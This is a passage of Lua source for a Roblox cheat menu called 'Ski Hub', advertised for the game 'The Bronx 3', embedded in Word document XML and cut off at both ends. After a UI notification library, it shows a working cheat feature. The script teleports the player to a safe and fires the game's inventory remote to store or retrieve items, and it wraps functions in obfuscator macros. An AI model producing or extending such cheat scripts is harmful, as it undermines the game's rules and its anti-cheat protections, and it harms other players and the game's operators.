        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AutomaticSize = Enum.AutomaticSize.Y;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(14, 14, 16)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "UIScale" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "notification" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Scale = scale;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"UIStroke" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Color = rgb(23, 23, 29);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "notification" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Transparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border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"title"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rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = cfg.name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "notification" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 7, 0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;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"notification" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 3)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"info" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = rgb(145, 145, 145);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = cfg.info;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "notification" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 9, 0, 22);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextXAlignment = Enum.TextXAlignment.Left;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextWrapped = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AutomaticSize = Enum.AutomaticSize.XY;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(255, 255, 255)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PaddingBottom = dim(0, 17);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingRight = dim(0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "info" ]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items[ "bar" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "notification" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 8, 1, -6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, 0, 5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = themes.preset.accent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"UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "bar" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 999)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingRight = dim(0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "notification" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local index = #notifications.notifs + 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            notifications.notifs[index] = items[ "notification" ]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            notifications:fade(items[ "notification" ], false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local offset = notifications:refresh_notifs()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "notification" ].Position = dim_offset(20, offset)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:tween(items[ "notification" ], {AnchorPoint = vec2(0, 0)}, Enum.EasingStyle.Quad, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:tween(items[ "bar" ], {Size = dim2(1, -8, 0, 5)}, Enum.EasingStyle.Quad, cfg.lifetime)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(cfg.lifetime)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                notifications.notifs[index] = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                notifications:fade(items[ "notification" ], true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "notification" ], {AnchorPoint = vec2(1, 0)}, Enum.EasingStyle.Quad, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "notification" ]:Destroy() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    --end)()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>-- \\ Script</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local window = library:window({name = "Ski Hub", suffix = "", gameInfo = string.format(" Best Tha Bronx 3 Script ", Game_Name:lower())})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if Game_Name == "The Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    window:seperator({name = ""}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local LocalPlayerTab, PlayersTab, PurchaseGunTab, ExtraTab, MiscTab, SafeTab = window:tab({name = "General", tabs = {"Local Player", "Players", "Teleports", "Extra", "Misc", "Safe"}, icon = GetImage("World.png")}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            do -- \\ Safe Tab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local SafeItemColumn = SafeTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local SafeItemSection = SafeItemColumn:section({name = "Safe Selected Item", side = "left", size = 1, icon = GetImage("Lock.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local _SafeItem = SafeItemSection:list({flag = "SafeSelectedItem_TheBronx", options = {}, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not state then</w:t>
      </w:r>
    </w:p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local Safe, OldCFrame = GetWorkingSafe(), LocalPlayer.Character.HumanoidRootPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        pcall(Teleport, Safe.ChestClicker.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Tool = tostring(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character:WaitForChild"Humanoid":UnequipTools()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local ItemSafed = false; local OldBackpackRemoved; OldBackpackRemoved = LocalPlayer.Backpack.ChildRemoved:Connect(function(Child)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if tostring(Child) == Tool then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ItemSafed = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                OldBackpackRemoved:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.delay(2, function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ItemSafed = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ReplicatedStorage.Inventory:FireServer("Change", Tool, "Backpack", Safe)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until ItemSafed == true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        pcall(Teleport, OldCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            info = `Successfully safed {state}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                SafeItemColumn = SafeTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                SafeItemSection = SafeItemColumn:section({name = "Take Selected Item", side = "right", size = 1, icon = GetImage("UZI.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local _TakeItem = SafeItemSection:list({flag = "TakeSelectedItem_TheBronx", options = {}, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not state then</w:t>
      </w:r>
    </w:p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local Safe, OldCFrame = GetWorkingSafe(), LocalPlayer.Character.HumanoidRootPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        pcall(Teleport, Safe.ChestClicker.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Tool = tostring(state);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local ItemSafed = false; local OldBackpackChildAdded; OldBackpackChildAdded = LocalPlayer.Backpack.ChildAdded:Connect(function(Child)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if tostring(Child) == Tool then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ItemSafed = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                OldBackpackChildAdded:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.delay(2, function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ItemSafed = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ReplicatedStorage.Inventory:FireServer("Change", Tool, "Inv", Safe)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until ItemSafed == true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        pcall(Teleport, OldCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            info = `Successfully took {state} from safe!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Backpack_ChildAdded, Backpack_ChildRemoved</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local ConnectBackpackToRefreshSafeList = LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer:WaitForChild("Backpack")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Refresh = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Items = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for Index, Value in LocalPlayer.Backpack:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Value:IsA("Tool") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                table.insert(Items, Value.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        table.sort(Items)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        _SafeItem.refresh_options(Items)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return Items</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(Refresh)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Backpack_ChildAdded then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Backpack_ChildAdded:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Backpack_ChildAdded = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Backpack_ChildRemoved then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Backpack_ChildRemoved:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Backpack_ChildRemoved = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Backpack_ChildAdded = LocalPlayer.Backpack.ChildAdded:Connect(Refresh)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Backpack_ChildRemoved = LocalPlayer.Backpack.ChildRemoved:Connect(Refresh)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players.PlayerRemoving:Connect(LPH_NO_VIRTUALIZE(function(Player)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Player == LocalPlayer then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Backpack_ChildAdded:Disconnect(); Backpack_ChildRemoved:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(ConnectBackpackToRefreshSafeList)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.CharacterAdded:Connect(ConnectBackpackToRefreshSafeList)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local RefreshTakeItemList = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Items = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in LocalPlayer:WaitForChild("InvData"):GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        table.insert(Items, Value.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.sort(Items)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    _TakeItem.refresh_options(Items)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return Items</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.spawn(RefreshTakeItemList)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer:WaitForChild("InvData").ChildAdded:Connect(RefreshTakeItemList)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer:WaitForChild("InvData").ChildRemoved:Connect(RefreshTakeItemList)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--[[experiment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local function FastTP(cf)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local char = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not char then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local HRP = char:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if HRP then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        HRP.CFrame = cf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local SafeItemSection = SafeItemColumn:section({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    name = "Safe Selected Item",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    side = "left",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    size = 1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    icon = GetImage("Lock.png")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local _SafeItem = SafeItemSection:list({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    flag = "SafeSelectedItem_TheBronx",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    options = {},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not state then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Safe = GetWorkingSafe()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Safe then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local HRP = LocalPlayer.Character.HumanoidRootPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local OldCFrame = HRP.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            FastTP(Safe.ChestClicker.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.05)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer.Character.Humanoid:UnequipTools()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Tool = tostring(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Done = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local conn</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            conn = LocalPlayer.Backpack.ChildRemoved:Connect(function(child)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
